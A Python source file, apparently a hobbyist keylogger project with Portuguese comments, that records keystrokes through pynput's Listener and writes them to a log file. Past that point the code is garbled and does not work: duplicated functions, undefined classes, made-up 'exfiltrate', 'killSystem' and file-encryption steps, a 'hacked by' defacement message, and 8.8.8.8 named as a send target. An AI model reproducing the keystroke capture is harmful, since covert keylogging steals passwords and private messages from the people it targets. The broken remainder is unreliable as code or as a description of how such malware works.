from pynput.keyboard import Listener

logFile = "/home/diegorego/keylogger_black_genesis/log.txt"

def writeLog(key):
    '''
    Esta função será responsável por receber a tecla pressionada
    via Listener e escrever no arquivo de log
    '''

    keydata = str(key)

    with open("logFile, a") as f:
        f.write(keydata)

def FileWrite():

    with FileWrite(on_listener=sendFiles) as fw:
        fw.send()

def keydata():
    keydata = keydata.replace("'", "")

translate_keys = {
     "Key.space": " ",
     "Key.shift_r": "",
     "Key.shift_l": "",
     "Key.enter": "\n",
     "Key.alt": "",
     "Key.esc": "",
     "Key.cmd": "",
     "Key.caps_lock": "",
}

for key in translate_keys:

    keydata

logFile = "/home/diegorego/keylogger_black_genesis/log.txt"

def writeLog(key):
    '''
    Esta função será responsável por receber a tecla personalizada
    via Listener e escrever no arquivo de log
    '''


    translate_keys = {
         "Key.space": " ",
	 "Key.shift_r": "",
	 "Key.shift_l": "",
	 "Key.enter": "\n",
	 "Key.alt": "",
	 "Key.esc": "",
	 "Key.cmd": "",
 	 "Key.caps_lock": "",
}

keydata = str(key)

keydata = keydata.replace("'", "")

for key in translate_keys:

    keydata = keydata.replace(key, translate_keys[key])

def File():

    with open(File) as f:
        f.write(keydata)

def log():

    with Listener(on_press=writeLog) as l:
        l.join(log)

def sendFiles():

    with FileWrite(on_listener=SENDFILES) as FW:
        FW.sendfiles(SENDFILES)
        GET.FDQN_GET.POST = "8.8.8.8"

    with HackIntercept(on_target=CAPTUREDATA) as HI:
        HI.capturedata(CAPTUREDATA)
        POST.SEND_GET_DATA_FROM = "WINDOWS11 / * MSG_AS = MESSAGE: YOU ARE PWN3D, HACKED BY CODK TEAM (BRAZIL HACKER TEAM), RESPECT THE HACKERS."

    with dataCapture(on_target_operating_system=DATACAPTURE) as DC:
        DC.dataCapture(on_target=DATACAPTURE+EXFILTRATEDATA)
        SEND.POST_MALICIOUS_DATA_TO_TARGET_OPERATING_SYSTEM = "WINDOWS11 / * GET_STATUS_CODE = 200_OK"

    with killTargetOS(on_target_os_cmd=KILLSYSTEM) as KTOS:
        KTC.killSystem("on_target_operating_system=COPY_DATA (Timeout=10) COPY_DATA=5000 MB+KILLSYSTEM")

def encryptFiles():

    with encryption as wb:
        ENCRYPTALGORITHM.EncryptFiles(target_operating_system=ENCRYPTFILES)
        EF.encryptfiles(on_target_operating_system=ENCRYPTFILES+ENCRYPTDATA)
        GET.ENCRYPTDATA_FROM_DECRYPTED_DATA = "WINDOWS11 / * GET_STATUS_CODE = 200_OK"

def decryptFiles():
    
    with decryption as wb:
        DECRYPTALGORITHM.DecryptFiles(target_operating_system=DECRYPTFILES)
        DF.decryptfiles(on_target_operating_system=DECRYPTFILES+DECRYPTDATA)
        GET.DECRYPTDATA_FROM_DECRYPTED_DATA = "WINDOWS11 / * GET_STATUS_CODE = 200_OK"
